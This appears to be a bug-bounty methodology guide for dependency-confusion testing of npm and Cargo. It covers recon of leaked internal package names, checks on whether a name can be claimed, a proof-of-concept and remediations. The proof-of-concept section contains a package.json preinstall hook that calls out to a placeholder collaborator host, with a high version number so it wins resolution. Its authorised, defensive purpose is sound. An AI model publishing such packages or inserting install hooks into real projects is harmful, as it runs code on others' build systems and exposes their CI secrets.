# Manual techniques — recon sources, ownership verification, safe PoC

## Where internal package names leak (recon → feed `--recon`)
- **Source maps** (`*.js.map`): the `sources[]` array contains
  `node_modules/<name>` and `webpack://@scope/pkg/...` paths. Highest signal.
  Pull every `.js.map` referenced by `//# sourceMappingURL=` in bundles.
- **Webpack/Vite bundles**: `require("x")`, `import ... from "x"`,
  `__webpack_require__` module maps, and string literals of `@scope/...`.
- **Leaked manifests**: exposed `/package.json`, `/package-lock.json`,
  `/yarn.lock`, `/pnpm-lock.yaml`, `.git` dumps, public repos, CI logs, Docker
  image layers (`docker save` → scan layer tars), S3 buckets.
- **HAR / Burp exports**: dump traffic to `.har`, feed to `--recon`.
- **Cargo**: leaked `Cargo.toml`/`Cargo.lock`, `use acme_internal::...` in
  published source, internal crate names in build logs.

Quick pulls:
```bash
# grab a site's JS + sourcemaps then hunt
katana -u https://target -ef png,svg,css | grep -E '\.js(\.map)?$' | sort -u > urls
wget -q -i urls -P dump/
python3 scripts/depconf.py --recon dump/ --ecosystem npm

# extract just the npm specifiers from a bundle for review
grep -oE "(require|from)[ (]['\"][^'\"]+['\"]" bundle.js | sort -u
```

## Verify ownership BEFORE claiming anything
A 404 means "not resolvable right now" — confirm it's truly claimable:
- npm: `npm view <name>` → `404` and `npm owner ls <name>` → error. Check
  `https://www.npmjs.com/package/<name>` is a real 404, not a security placeholder.
- npm scope: `https://registry.npmjs.org/-/v1/search?text=scope:<scope>` empty
  `total` ⇒ scope is claimable (you'd create the org). Non-empty ⇒ reserved.
- crates.io: `https://crates.io/api/v1/crates/<name>` → 404. Names are permanent,
  so a 404 is a clean "available".

## Safe PoC (never attack third parties)
The goal is to prove **resolvability + precedence**, not to ship a payload to
someone else's CI.

1. **Authorized-name only.** Publish only under a name the program explicitly
   invited you to claim, or test the resolution path on **your own** install.
2. **Passive, benign callback.** Minimal `preinstall` that does one outbound
   DNS/HTTP to a collaborator you control — no exfil, no persistence, no file
   access beyond reading the install env to prove execution context:
   ```json
   { "name": "<authorized-name>", "version": "99.0.0",
     "scripts": { "preinstall": "node -e \"require('https').get('https://<your-collab>/h/'+require('os').hostname())\"" } }
   ```
   Rust equivalent: a `build.rs` that makes one callback. Keep version high so it
   wins semver precedence, proving the confusion path.
3. **Capture proof**: publish output, the install resolving your version, and the
   callback hit (timestamp, requesting host). Unpublish/yank after the report is
   acknowledged.
4. **Blast-radius discipline.** A high version on a popular internal name can hit
   many builds. Prefer demonstrating on your own `npm install <name>` against the
   public registry, or coordinate timing with the program.

## Impact framing
Successful confusion = **arbitrary code execution** in the victim's install/CI
context (install hooks run automatically) → stolen CI secrets/tokens, poisoned
build artifacts, lateral movement, and downstream supply-chain compromise.

## Defenses (put these in the report's remediation)
- Reserve your org **scope** on the public registry even if you only use a private one.
- Pin per-scope private registry: `@org:registry=https://registry.internal/` in `.npmrc`.
- Use scoped names for all internal packages; never bare internal names.
- Cargo: always specify `registry =` (or `path`/`git`); never a bare internal crate.
- Commit lockfiles; enable install-time integrity; disable install scripts in CI where possible.
- Monitor public registries for first-seen events on your internal names.

## Related tooling (cross-check / complement depconf)
- `confused` (visma-prodsec) — manifest checker for npm/pip/composer/mvn/gradle/rubygems.
- `snync` (Snyk) — dependency-confusion detector.
- This engine adds: cargo/crates support, scope-ownership resolution, lockfile
  resolved-host evidence, and artifact/sourcemap **recon** mode.
